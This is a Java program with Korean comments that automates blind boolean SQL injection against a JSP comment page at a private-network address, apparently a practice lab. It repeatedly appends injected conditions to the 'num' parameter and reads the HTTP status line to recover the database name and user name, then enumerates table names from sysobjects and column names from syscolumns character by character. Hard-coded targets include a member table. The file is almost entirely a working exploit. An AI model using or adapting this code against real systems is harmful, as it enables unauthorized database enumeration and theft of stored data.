import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class Test {

	public static void main(String[] args) throws Exception {
		String targetUrl = "http://192.168.232.129/jsp/cmnt_view02.jsp?num=1 ";
		
		int dbLength = getDbLength(targetUrl);
		
//		String dbName = getDbName(targetUrl, dbLength);
//		System.out.println("Database 이름 : " + dbName);
//		
//		String dbUser = getDbUserName(targetUrl, dbLength);
//		System.out.println("Database 사용자이름 : " + dbUser);
//		
//		List<String> tableList = getDbTableInfo(targetUrl, dbLength); 
//		System.out.println("Database Table List : \n"+ tableList);
//		
//		System.out.println(getDbSchColums(targetUrl, dbLength, tableList));
		
		List<String> tableList = new ArrayList<>();
		getDbSchColums(targetUrl, dbLength, tableList);
		
//		getDbTalbeColums(targetUrl, dbLength, "BOARD1");
	}

	/**
	 * 
	 * @param p_url
	 * @return
	 */
	private static int getDbLength(String p_url) {
		int cnt = 0;
		String url = "";

		while (true) {
			cnt++;
			url = p_url + "and (len(db_name()))=" + cnt;
			url = url.replaceAll(" ", "%20"); // 공백처리
			if (sendRequest(url).contains("200"))
				break;
		}

		return cnt;
	}

	/**
	 * 
	 * @param p_url
	 * @param p_dbLength
	 * @return
	 */
	private static String getDbName(String p_url, int p_dbLength) {
		char[] arr = new char[p_dbLength];
		int index = 0;
		String url = "";
		char c = ' ';

		for (int i = 1; i <= p_dbLength; i++) { // db길이만큼
			for (int j = 48; j <= 89; j++) { // 아스키코드 0~Z
				c = (char) j; // 문자로 다시 변환

				if (j < 58) {
					url = p_url + " and substring(db_name()," + i + ",1)=" + c;
				} else {
					url = p_url + " and substring(db_name()," + i + ",1)='" + c
							+ "'";
				}
				url = url.replaceAll(" ", "%20");

				if (sendRequest(url).contains("200")) {
					arr[index++] = c;
					break;
				}
			}
		}

		return new String(arr);
	}

	/**
	 * 
	 * @param p_url
	 * @param p_dbLength
	 * @return
	 */
	private static String getDbUserName(String p_url, int p_dbLength) {
		int dbUserNameLength = 0;
		int cnt = 0;

		while (true) {
			cnt++;
			String url = p_url + " and len(user_name())=" + cnt;
			url = url.replaceAll(" ", "%20");

			if (sendRequest(url).contains("200")) {
				dbUserNameLength = cnt;
				break;
			}
		}

		char[] arr2 = new char[dbUserNameLength];
		int index2 = 0;

		for (int i = 1; i <= dbUserNameLength; i++) {
			for (int j = 48; j <= 89; j++) {
				char c = (char) j;
				String url = "";
				url = p_url + " and substring(user_name()," + i + ",1)='" + c
						+ "'";
				url = url.replaceAll(" ", "%20");
				if (sendRequest(url).contains("200")) {
					arr2[index2++] = c;
					break;
				}
			}
		}

		return new String(arr2);
	}

	/**
	 * 
	 */
	private static List<String> getDbTableInfo(String p_url, int p_dbLength) {
		int totalTableCnt = 0; 
		int cnt = 0; //테이블카운트
		List<String> tableList = new ArrayList<String>(); // 테이블이름 저장할 list
		String currentTable = ""; //찾은테이블
		
		// 테이블갯수
		while (true) {
			cnt++;
			String url = p_url
					+ " and (select a.cnt from (select count(name) as cnt from sysobjects where type='U') as a) ="
					+ cnt;
			url = url.replaceAll(" ", "%20");

			if (sendRequest(url).contains("200")) {
				totalTableCnt = cnt;
				break;
			}
		}

		System.out.println("totalTableCnt : " + totalTableCnt);

		// ------------------------------------ table length �˾Ƴ���
		

		// 테이블갯수만큼 조사
		for (int k = 1; k <= totalTableCnt; k++) {

			int tableNameLength = 0;
			int tableNmCnt = 0;

			while (true) {
				tableNmCnt++;
				String url = "";
				if (currentTable.equals("")) {
					url = p_url
							+ " and (select LEN(a.name) from (SELECT TOP 1 NAME from sysobjects where xtype='U') as a)="
							+ tableNmCnt;
				} else {
					url = p_url
							+ " and (select LEN(a.name) from (SELECT TOP 1 NAME from sysobjects where xtype='U' and name not in ("
							+ currentTable + ")) as a)=" + tableNmCnt;
				}
				url = url.replaceAll(" ", "%20");

				if (sendRequest(url).contains("200")) {
					tableNameLength = tableNmCnt;
					break;
				}
			}

			System.out.println("tableNameLength : " + tableNameLength);

			// table name �˾Ƴ���

			char[] arr3 = new char[tableNameLength];
			int index3 = 0;

			for (int i = 1; i <= tableNameLength; i++) {
				for (int j = 96; j >= 48; j--) {
					char c = (char) j;
					String url = "";

					if (currentTable.equals("")) {
						if (j < 58) {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (SELECT TOP 1 NAME from sysobjects where xtype='U') as a)="
									+ c;
						} else {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (SELECT TOP 1 NAME from sysobjects where xtype='U') as a)='"
									+ c + "'";
						}
					} else {
						if (j < 58) {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (SELECT TOP 1 NAME from sysobjects where xtype='U' and name not in("
									+ currentTable + ")) as a)=" + c;
						} else {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (SELECT TOP 1 NAME from sysobjects where xtype='U' and name not in("
									+ currentTable + ")) as a)='" + c + "'";
						}
					}
					url = url.replaceAll(" ", "%20");
					if (sendRequest(url).contains("200")) {
						arr3[index3++] = c;
						// 성공한문자
						break;
					}
				} // 문자검사
			} // 테이블이름조사
				// 테이블 찾은것을

			tableList.add(new String(arr3));
			if (!currentTable.equals("")) {
				currentTable += ",'" + new String(arr3) + "'";
			} else {
				currentTable = "'" + new String(arr3) + "'";
			}
			System.out.println("Find Tables = " + currentTable);
		} // 테이블갯수만큼조사

		return tableList;
	}
	
	/**
	 * 
	 * @param p_url
	 * @param p_dbLength
	 * @param p_tableNm
	 * @return
	 */
	private static HashMap<String,List<String>> getDbTalbeColums(String p_url, int p_dbLength, String p_tableNm){
		HashMap<String,List<String>> colMap = new HashMap<String,List<String>>();
		List<String> colList = new ArrayList<>();
		int totalColCnt = 0; 
		int cnt = 0; //테이블카운트
		String currentCols = ""; //찾은테이블
		// 컬럼갯수
		while (true) {
			cnt++;
			String url = p_url
					+ " and (select count(a.name) from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"') ="
					+ cnt;
			url = url.replaceAll(" ", "%20");

			if (sendRequest(url).contains("200")) {
				totalColCnt = cnt;
				break;
			}
		}

		System.out.println("totalColumCnt : " + totalColCnt);
		
		// 컬럼갯수만큼 조사
		for (int k = 1; k <= totalColCnt; k++) {
			
			int nameLength = 0;
			int nmCnt = 0;

			while (true) {
				nmCnt++;
				String url = "";
				if (currentCols.equals("")) {
					url = p_url
					+ " and (select top 1 len(a.name) from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"') ="
					+ nmCnt;
				} else {
					url = p_url
					+ " and (select top 1 len(a.name) from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"' and a.name not in("
					+ currentCols + "))=" + nmCnt;
				}
				url = url.replaceAll(" ", "%20");

				if (sendRequest(url).contains("200")) {
					nameLength = nmCnt;
					break;
				}
			}

			System.out.println("nameLength : " + nameLength);

			// table name �˾Ƴ���

			char[] arr3 = new char[nameLength];
			int index3 = 0;

			for (int i = 1; i <= nameLength; i++) {
				for (int j = 96; j >= 48; j--) {
					char c = (char) j;
					String url = "";

					if (currentCols.equals("")) {
						if (j < 58) {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (select top 1 a.name from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"') as a)="
									+ c;
						} else {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (select top 1 a.name from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"') as a)='"
									+ c + "'";
						}
					} else {
						if (j < 58) {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (select top 1 a.name from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"' and a.name not in("
									+ currentCols + ")) as a)=" + c;
						} else {
							url = p_url
									+ " and (select substring(a.name,"
									+ i
									+ ",1) from (select top 1 a.name from dbo.syscolumns a, dbo.sysobjects b where a.id = b.id and b.xtype = 'U' and b.name = '"+p_tableNm+"' and a.name not in("
									+ currentCols + ")) as a)='" + c + "'";
						}
					}
					url = url.replaceAll(" ", "%20");
					if (sendRequest(url).contains("200")) {
						arr3[index3++] = c;
						// 성공한문자
						break;
					}
				} // 문자검사
			} //  
			String tempCol = new String(arr3);
			
			if (!currentCols.equals("")) {
				currentCols += ",'" + tempCol + "'";
			} else {
				currentCols = "'" + tempCol + "'";
			}
			
			colList.add(tempCol); // 컬럼이름을 리스트에담고
			
			colMap.put(p_tableNm, colList); // 테이블이름 = 컬럼리스트
			
			System.out.println("Find Coluems = " + currentCols);
		} // 테이블갯수만큼조사
		
		return colMap;
	}
	
	private static List<HashMap<String, List<String>>> getDbSchColums(String p_url, int p_dbLength, List<String> p_tableNm){
		List<HashMap<String, List<String>>> list = new ArrayList<>();
		
//		p_tableNm.add("TBL_NOTICE");
//		p_tableNm.add("BOARD");
//		p_tableNm.add("BOARD1");
//		p_tableNm.add("BOARD2");
//		p_tableNm.add("BOARD3");
//		p_tableNm.add("BOARD4");
		p_tableNm.add("DTPROPERTIES");
		p_tableNm.add("TBL_MEMBER");
		p_tableNm.add("TBL_POLL");
		p_tableNm.add("TBL_SAVE");
		p_tableNm.add("ZIPCODE");
//		[TBL_NOTICE, BOARD, BOARD1, BOARD2, BOARD3, BOARD4, DTPROPERTIES, TBL_MEMBER, TBL_POLL, TBL_SAVE, ZIPCODE]
		for (int i = 0; i < p_tableNm.size(); i++) {
			System.out.println(p_tableNm.get(i));
			list.add(getDbTalbeColums(p_url, p_dbLength, p_tableNm.get(i)));
		}
		return list;
	}
	
	/**
	 * @param p_url
	 * @return
	 */
	private static String sendRequest(String p_url) {
		String resultOfRequest = "";

		try {
			URL obj = new URL(p_url);
			URLConnection conn = obj.openConnection();
			resultOfRequest = conn.getHeaderField(null);
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return resultOfRequest;
	}
}
